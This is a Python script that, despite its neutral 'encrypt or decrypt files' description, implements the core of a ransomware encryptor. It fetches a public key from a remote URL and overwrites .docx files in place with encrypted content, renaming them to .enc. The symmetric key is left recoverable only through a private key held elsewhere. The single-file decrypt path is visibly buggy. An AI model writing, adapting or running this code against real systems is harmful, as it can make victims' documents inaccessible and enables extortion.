import urllib.request
import json
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.serialization import load_pem_public_key, load_pem_private_key
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
import os

class encrypter:
    def __init__(self, url, file_path):
        """
        Initialize the encrypter with a URL to fetch the public key and a file path.
        :param url: URL to fetch the public key for encryption.
        :param file_path: Path to the file or directory to encrypt.
        :type url: str
        :type file_path: str

        """
        self.symmetric_key = Fernet.generate_key()
        self.b64_public_key = self._get_public_key(url)
        self.files_to_encrypt = []
        self.file_path = file_path
        if not os.path.exists(file_path):
            print(f"File {file_path} does not exist.")
            exit(-1)

        if os.path.isdir(file_path):
            files = os.listdir(file_path)
            self.files_to_encrypt = self._is_files_to_encrypt(files)
        else:
            self.files_to_encrypt = self._is_files_to_encrypt([os.path.basename(file_path)])
            self.file_path = os.path.dirname(file_path)

        if not self.files_to_encrypt:
            print("No files to encrypt.")
            exit(-1)

    def _get_public_key(self, url):
        """
        Fetch the public key from the given URL.
        :param url: URL to fetch the public key.
        :type url: str
        :return: Base64 encoded public key.
        :rtype: str
        """
        try:
            response = urllib.request.urlopen(url)
            b64_public_key = response.read().decode('utf-8')
            return b64_public_key
        except Exception as e:
            print(f"Error fetching public key: {e}")
            exit(-1)

    def _is_files_to_encrypt(self, file_names):
        """
        Check if the files in the given list are to be encrypted based on their extensions.
        :param file_names: List of file names to check.
        :type file_names: list
        :return: List of files that need to be encrypted.
        :rtype: list
        """
        to_encrypt = ['.docx']
        encrypted_files = []
        for file_name in file_names:
            if any(file_name.endswith(ext) for ext in to_encrypt):
                encrypted_files.append(file_name)
        return encrypted_files

    def _encrypt_symmetric_key(self):
        """
        Encrypt the symmetric key using the public key and save it to a file.
        :return: None
        :rtype: None
        """
        key = load_pem_public_key(self.b64_public_key.encode('utf-8'))
        ciphertext = key.encrypt(
            self.symmetric_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        open('symmetric_key.enc', 'wb').write(ciphertext)

    def encrypt_files(self):
        """
        Encrypt the files in the specified directory or file using the symmetric key.
        :return: None
        :rtype: None
        """
        for file in self.files_to_encrypt:
            file = os.path.join(self.file_path, file)
            with open(file, 'rb') as f:
                data = f.read()
            fernet = Fernet(self.symmetric_key)
            encrypted_data = fernet.encrypt(data)
            with open(file, 'wb') as f:
                f.write(encrypted_data)
            os.rename(file, file + '.enc')
            print(f"Encrypted {file} to {file}.enc")
            
        self._encrypt_symmetric_key()
        exit(0)
                
        
class decrypter:
    def __init__(self, private_key_path, file_path):
        """
        Initialize the decrypter with a private key path and a file path.
        :param private_key_path: Path to the private key for decryption.
        :param file_path: Path to the file or directory to decrypt.
        :type private_key_path: str
        :type file_path: str
        """
        self.private_key_path = private_key_path
        self.file_path = file_path
        self.symmetric_key = None
        self.files_to_decrypt = []
        
        if not os.path.exists(private_key_path):
            print(f"Private key file {private_key_path} does not exist.")
            exit(-1)

        if not os.path.exists(file_path):
            print(f"File {file_path} does not exist.")
            exit(-1)

        self.private_key = self._load_private_key()
        self._decrypt_symmetric_key()

        if os.path.isdir(file_path):
            files = os.listdir(file_path)
            self.files_to_decrypt = [file for file in files if file.endswith('.enc')]
        else:
            if file_path.endswith('.enc'):
                self.files_to_decrypt = os.path.basename(file_path)
                self.file_path = os.path.dirname(file_path)
            else:
                print("The file to decrypt must have a .enc extension.")
                exit(-1)

        if not self.files_to_decrypt:
            print("No files to decrypt.")
            exit(-1)
    
    def _load_private_key(self):
        """
        Load the private key from the specified path.
        :return: Loaded private key.
        :rtype: rsa.RSAPrivateKey
        """
        with open(self.private_key_path, "rb") as key_file:
            private_key = load_pem_private_key(
                key_file.read(),
                password=None,
            )
        return private_key

    def _decrypt_symmetric_key(self):
        """
        Decrypt the symmetric key using the private key and save it to an instance variable.
        :return: None
        :rtype: None
        """
        with open('symmetric_key.enc', 'rb') as f:
            ciphertext = f.read()
        self.symmetric_key = self.private_key.decrypt(
            ciphertext,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        print("Symmetric key decrypted successfully.")

    def decrypt_files(self):
        """
        Decrypt the files in the specified directory or file using the symmetric key.
        :return: None
        :rtype: None
        """
        for file in self.files_to_decrypt:
            file = os.path.join(self.file_path, file)
            with open(file, 'rb') as f:
                data = f.read()
            fernet = Fernet(self.symmetric_key)
            decrypted_data = fernet.decrypt(data)
            with open(file, 'wb') as f:
                f.write(decrypted_data)
            os.rename(file, file[:-4])
            print(f"Decrypted {file}.enc to {file[:-4]}") 
        exit(0)

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Encrypt or decrypt files using asymmetric encryption.")
    parser.add_argument('--mode', choices=['encrypt', 'decrypt'], required=True, help="Mode of operation: encrypt or decrypt")
    parser.add_argument('--url', type=str, help="URL to fetch the public key for encryption")
    parser.add_argument('--private_key', type=str, help="Path to the private key for decryption")
    parser.add_argument('--file_path', type=str, required=True, help="Path to the file or directory to encrypt/decrypt")

    args = parser.parse_args() 

    if args.mode == 'encrypt':
        if not args.url:
            print("URL is required for encryption.")
            exit(-1)
        enc = encrypter(args.url, args.file_path)
        enc.encrypt_files()
    elif args.mode == 'decrypt':
        if not args.private_key:
            print("Private key path is required for decryption.")
            exit(-1)
        dec = decrypter(args.private_key, args.file_path)
        dec.decrypt_files()
